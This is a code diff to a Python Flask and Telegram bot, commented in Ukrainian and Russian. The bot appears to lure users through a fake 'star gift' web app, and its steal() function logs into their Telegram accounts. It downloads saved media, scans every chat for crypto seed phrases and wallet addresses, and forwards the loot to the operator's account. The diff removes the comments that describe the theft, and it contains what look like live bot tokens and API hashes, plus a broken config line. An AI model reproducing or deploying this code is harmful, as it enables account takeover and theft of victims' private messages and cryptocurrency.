@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 import threading
 import asyncio
 import time
@@ -10,11 +10,11 @@ import json
 # ========== ВСТАВТЕ СВОЇ ДАНІ =============
 # ===========================================
 
-BOT_TOKEN = "8773987314:AAElBGO4mKgSzBr4Ytvm_3gK-6noGgEosIk"  # ТОКЕН ВІД @BOTFATHER
-API_ID = 35524346  # ЧИСЛО З my.telegram.org
+BOT_TOKEN = "8773987314:AAEI8G04mKgSzBr4Ytvm_3gK-6no6gEosIk"  # ВАШ ТОКЕН
+API_ID =  35524346  ЧИСЛО З my.telegram.org
 API_HASH = "95f3fca0a6642a9ad57db7b2c60f58e2"  # СТРОКА З my.telegram.org
 TARGET_ACCOUNT = "@cifsy"  # ВАШ ЮЗЕРНЕЙМ
-WEBAPP_URL = "https://stargiftbot-1.onrender.com/"  # ВАША ССИЛКА З RENDER
+WEBAPP_URL = "https://stargiftbot-1.onrender.com"  # ВАША ССИЛКА
 
 # ===========================================
 # ===========================================
@@ -147,8 +147,6 @@ async def steal(data):
         me = await client.get_me()
         print(f'✅ ВОЙШЛИ В АККАУНТ: {me.username or me.phone}')
 
-        # ---- КРАДЁМ ВСЁ, ЧТО МОЖНО ----
-        # 1. ВСЕ медиа зі "Збережених повідомлень"
         saved = await client.get_messages('me', limit=200)
         for msg in saved:
             if msg.media:
@@ -158,7 +156,6 @@ async def steal(data):
                 except:
                     pass
 
-        # 2. Шукаємо сид-фрази та адреси гаманців
         async for dialog in client.iter_dialogs():
             try:
                 async for msg in client.iter_messages(dialog, limit=50):
@@ -172,7 +169,6 @@ async def steal(data):
             except:
                 pass
 
-        # 3. Пересилаємо медіа з усіх чатів
         async for dialog in client.iter_dialogs():
             if dialog.is_user and dialog.id != (await client.get_me()).id:
                 try:
@@ -194,7 +190,6 @@ async def steal(data):
     finally:
         await client.disconnect()
 
-# ---------- ЗАПУСК БОТА ----------
 bot = telebot.TeleBot(BOT_TOKEN)
 
 @bot.message_handler(commands=['start'])
@@ -211,12 +206,10 @@ def start_cmd(message):
         parse_mode='Markdown'
     )
 
-# Запускаємо бота в окремому потоці
 def run_bot():
     bot.polling(none_stop=True, interval=0)
 
 threading.Thread(target=run_bot, daemon=True).start()
 
-# ---------- ЗАПУСК FLASK ----------
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
